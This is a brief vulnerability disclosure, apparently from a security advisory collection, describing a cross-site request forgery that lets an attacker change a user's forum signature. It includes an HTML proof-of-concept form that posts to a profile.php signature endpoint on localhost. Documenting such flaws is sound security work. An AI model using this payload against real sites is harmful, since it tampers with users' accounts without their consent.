# Edit Signature CSRF
Allows to edit the signature of a user through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form id="LAYER_form" action="http://localhost/profile.php/cmd/signature" method="POST" style="padding: 25px;">
    <label for="sig">Signature</label>
    <textarea name="sig" id="editor" style="width: 100%; height: 300px; max-width: 100%; min-width: 100%;"></textarea>
    <br><br>
    <input type="submit" name="edit" value="Save Changes">
</form>
```
